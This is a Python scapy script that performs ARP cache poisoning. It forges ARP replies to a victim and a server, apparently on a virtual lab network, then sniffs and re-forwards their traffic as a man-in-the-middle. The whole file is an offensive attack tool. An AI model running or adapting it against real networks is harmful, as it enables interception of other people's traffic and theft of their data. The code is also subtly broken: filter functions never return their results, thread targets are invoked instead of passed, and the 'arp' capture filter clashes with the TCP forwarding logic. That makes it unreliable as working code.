from scapy.all import *
from scapy.layers.inet import IP, TCP
import threading
from threading import Lock
import time

lock = Lock()
networkInterface = "enp0s3"
victimIP = "192.168.56.101"
victimMAC = "08:00:27:b0:a1:ab"

serverIP = "192.168.56.102"
serverMAC = "08:00:27:c6:a4:61"

attackerIP = get_if_addr(networkInterface)
attackerMAC = get_if_hwaddr(networkInterface)

interceptedPkt = []
clients = {}


def arpPoisoning(attackerIP, attackerMAC):
    pktV = Ether() / ARP()
    pktV[Ether].src = attackerMAC
    pktV[ARP].hwsrc = attackerMAC
    pktV[ARP].psrc = serverIP
    pktV[ARP].hwdst = victimMAC
    pktV[ARP].pdst = victimIP

    sendp(pktV, iface=networkInterface)

    # clientsToSpoof(victimIP)

    # lock.acquire()
    # print(clients)
    # lock.release()
    # for ip, mac in clients:
    #     pktS = Ether() / ARP()
    #     pktS[Ether].src = attackerMAC
    #     pktS[ARP].hwsrc = attackerMAC
    #     pktS[ARP].psrc = victimIP
    #     pktS[ARP].hwdst = mac
    #     pktS[ARP].pdst = ip
    #
    #     sendp(pktS, iface=networkInterface)

    pktS = Ether() / ARP()
    pktS[Ether].src = attackerMAC
    pktS[ARP].hwsrc = attackerMAC
    pktS[ARP].psrc = victimIP
    pktS[ARP].hwdst = serverMAC
    pktS[ARP].pdst = serverIP

    sendp(pktS, iface=networkInterface)
    time.sleep(10)

def snifFilter(pkt):
    if (pkt.haslayer(TCP) and pkt[Ether].dst == attackerMAC and (
             pkt[IP].dst in clients.values() or pkt[IP].dst == victimIP)):
        True
    else:
        False


def arpSniffing(attackerMAC):
    def intercept(pkt):
        interceptedPkt.append(pkt)
        if pkt[IP].dst == serverIP:
            pkt[Ether].dst = serverMAC
        else:
            pkt[Ether].dst = victimMAC

        pkt[Ether].src = attackerMAC
        sendp(pkt, iface=networkInterface)

    sniff(prn=intercept, iface=networkInterface, filter="arp", lfilter = snifFilter)

def snifClientFilter(pkt):
    if (pkt.haslayer(TCP) and pkt[IP].dst not in clients.values()):
        True
    else:
        False

def clientsToSpoof(victimIP):
    def intercept(pkt):
        lock.acquire()
        print(pkt[ARP].pdst)
        getMAC(pkt[ARP].pdst)
        lock.release()

    sniff(prn=intercept, iface=networkInterface, filter="arp", lfilter = snifClientFilter)



def arp(attackerIP, attackerMAC):
    poisonThread = threading.Thread(target=arpPoisoning(attackerIP, attackerMAC))
    poisonThread.daemon = True
    poisonThread.start()

    # clientThread = threading.Thread(target=clientsToSpoof(victimIP))
    # clientThread.daemon = True
    # clientThread.start()

    sniffThread = threading.Thread(target = arpSniffing(attackerMAC))
    sniffThread.daemon = True
    sniffThread.start()



def getMAC(victinIP):
    arp = ARP(pdst=victimIP)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    pkt = ether / arp
    networkInterface = "enp0s3"

    result = srp(pkt, iface=networkInterface, timeout=2, inter=0.1)[0]

    for sent, received in result:
        if received.hwsrc not in clients.keys():
            clients[received.hwsrc] = received.psrc


def main():
    arp(attackerIP, attackerMAC)


main()